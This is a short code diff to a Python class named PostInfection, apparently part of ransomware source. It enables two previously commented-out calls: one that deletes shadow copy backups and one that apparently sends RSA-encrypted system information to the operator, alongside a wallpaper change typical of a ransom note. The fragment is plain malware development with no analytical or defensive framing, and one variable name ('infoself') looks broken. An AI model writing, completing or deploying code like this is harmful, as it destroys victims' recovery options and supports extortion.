@@ -115,7 +115,7 @@ class PostInfection(object):
 
     
     def firstWork(self):
-        # self.deleteShadowFiles()
+        self.deleteShadowFiles()
         try:
             self.changeWallpaper()
         except:
@@ -125,7 +125,7 @@ class PostInfection(object):
 
         rsa_cipher = RSACipher(self.rsa_pub_key)
         encrypted_system_info = base64.b64encode(rsa_cipher.encrypt(infoself.encode()))
-        # self.firstTouch(self.collectFirstTouchInfos())
+        self.firstTouch(self.collectFirstTouchInfos())
 
 
     def firstTouch(self, encryptedInformations):
